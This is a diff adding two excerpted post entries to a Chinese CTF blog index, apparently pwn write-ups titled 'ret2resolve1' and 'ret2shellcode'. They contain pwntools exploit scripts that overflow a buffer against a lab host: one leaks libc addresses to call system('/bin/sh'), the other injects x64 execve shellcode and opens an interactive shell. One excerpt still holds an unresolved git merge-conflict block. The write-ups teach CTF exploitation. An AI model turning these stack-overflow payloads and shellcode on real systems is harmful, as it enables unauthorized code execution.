@@ -158,6 +158,47 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2>ret2resolve1
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先查看基本情况：
+在IDA里我们可以看到main函数和产生溢出的函数：
+我们可以看到，main函数中有一个write函数，而vuln函数中有溢出点。
+那么我们可以使用write函数来泄露函数地址，从而得到libc版本，再通过/bin/sh和system函数的偏移量来做这道题。
+首先我们需要泄露服务器端的函数地址：
+from pwn import *context.log_level = &#39;debug&#39;p = remote(&#39;10.0.25.109&#39;,10009)elf = ELF(&#39;ret2resolve&#39;)#p = process(&#39;./ret2resolve&#39;)if args.G:gdb.attach(p)payload = 112 * b&#39;a&#39;payload &#43;= p32(elf.plt[&#39;write&#39;])payload &#43;= p32(elf.symbols[&#39;main&#39;])payload &#43;= p32(1)payload &#43;= p32(elf.got[&#39;write&#39;])payload &#43;= p32(4)payload &#43;= p32(elf.symbols[&#39;main&#39;])p.sendline(payload)write_addr = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])#write_addr = u32(p.recv(4))print(&#39;write_addr =&#39;,hex(write_addr)) 运行脚本后，就可以打印出write函数的地址：
+可以看到，函数的后12位是460。
+然后修改一下上面的脚本，我们可以输出一些其他的函数：
+我们使用ret2libc3中提到的查看libc版本的网址：https://libc.rip/
+这样，libc的版本就被泄露了。然后根据偏移量，我们可以计算出程序的基地址和system函数和/bin/sh的地址：
+libcbase = write_addr - 0xd44d0system = libcbase &#43; 0x3a950binsh = libcbase &#43; 0x15912bpayload = 112 * b&#39;a&#39;payload &#43;= p32(system)payload &#43;= p32(0xdeadbeef)payload &#43;= p32(binsh)sh....</p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to ret2resolve1" href="https://jellyfish-pro.github.io/ctf/ret2resolve1/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>ret2shellcode
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先查看基本情况：
+ida中也没有看到system和/bin/sh
+可以看到栈可执行，我们需要判断是jmp rsp还是输入shellcode：
+在IDA中我们可以看到read函数可以输入0x40个字符，但buf却只存取8个字符，所以我们有0x38个字符可以输入，这个长度我们可以使用shellcode
+shellcode = &#39;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#39; 又因为程序开启了PIE，我们需要计算shellcode的地址：
+p.recvuntil(&#39;[&#39;) buf_addr = p.recvuntil(&#39;]&#39;,drop=True) 这样就可以计算出存放字符的起始地址
+然后构造payload：
+payload = flat([&#39;a&#39;*16,p64(int(buf_addr,16)&#43;8&#43;8&#43;8),shellcode])//‘a’*16：填充字符&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD//p64(int(buf_addr,16)&#43;8&#43;8&#43;8)：buf_addr的起始地址&#43;read函数读取的8位&#43;rbp的填充&#43;shellcode的8位地址=======//p64(int(buf_addr,16)&#43;8&#43;8&#43;8)：buf_addr的起始地址&#43;read函数读取的8位&#43;leave使用掉的8位&#43;shellcode的8位地址//leave = mov esp,ebp;pop ebp&gt;&gt;&gt;&gt;&gt;&gt;&gt; origin/dev #ret2shellcode_x64from pwn import *#p = process(&#34;./ret2shellcode&#34;)p = remote(&#34;10.0.25.109&#34;,10000)shellcode = &#39;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#39;p.recvuntil(&#39;:&#39;)buf_addr = p.recvuntil(&#39;\n&#39;,drop=True)payload = flat([&#39;a&#39;*16,p64(int(buf_addr,16)&#43;8&#43;8&#43;8),shellcode])p.sendline(payload)p.interactive() </p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to ret2shellcode" href="https://jellyfish-pro.github.io/ctf/ret2shellcode/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2>ret2syscall
     </h2>
   </header>
